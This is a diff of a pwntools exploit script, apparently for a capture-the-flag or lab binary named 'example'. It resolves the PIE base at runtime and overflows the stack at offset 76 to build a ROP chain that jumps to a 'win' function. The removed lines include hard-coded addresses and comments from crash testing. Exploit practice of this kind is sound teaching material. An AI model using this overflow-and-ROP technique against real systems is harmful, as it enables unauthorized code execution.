@@ -39,42 +39,32 @@ import sys
 from pwn import *
 from itertools import cycle
 
-with process('./example') as p:
-    base_address = p.libs()['/app/example']
-    print(f"got {base_address=}={hex(base_address)}, {type(base_address)=}")
-
 elf = ELF("./example")
-print("elf address before", elf.address)
-elf.address = base_address
-print("elf address after", elf.address)
 
+with elf.process() as p:
+    # To compensate for PIE, we must know the offset at runtime.
+    base_address = p.libs()['/app/example']
+    # Then, we ensure our functions are offset by that amount.
+    elf.address = base_address
+
+# Now, we can create our attack.
+## --------------
 rop = ROP(elf)
-print("rop address", rop.address)
 rop.win()
 
-goal = 0x565561ad
-print("goal = 0x565561ad")
+
+offset = 76 # This needs to be the offset for eip
+## --------------
+
+payload = flat({
+    offset: rop.chain()
+})
+
+print("ropchain:")
 print(rop.dump())
+print("payload:")
+print(rop.chain())
 
-offset = 76 # eip offset
-
-shellcode = {
-    offset: b"\xad\x61\x55\x56", # $1 = {<text variable, no debug info>} 0x565561ad <win>
-    # int(sys.argv[2]): b"\xad\x61\x55\x56", # $1 = {<text variable, no debug info>} 0x565561ad <win>
-    #  87: 0x565561adb, # $1 = {<text variable, no debug info>} 0x565561ad <win>
-    #  59: 0x565561adb, # $1 = {<text variable, no debug info>} 0x565561ad <win>
-}
-
-payload = flat(shellcode, filler=cycle(b'A'))
-
-with process(['./example', payload]) as p:
+with elf.process([payload]) as p:
     p.interactive()
-
-
-# ./example "$(python3 -c "print('A' * 77)")" 
-# -> segfault at 0 ip 0000000000000000 
-# ./example "$(python3 -c "print('A' * 78)")" 
-# -> segfault at ff00413d ip 0000000056556243
-# ./example "$(python3 -c "print('A' * 78)")" 
-# -> segfault at 41413d
 
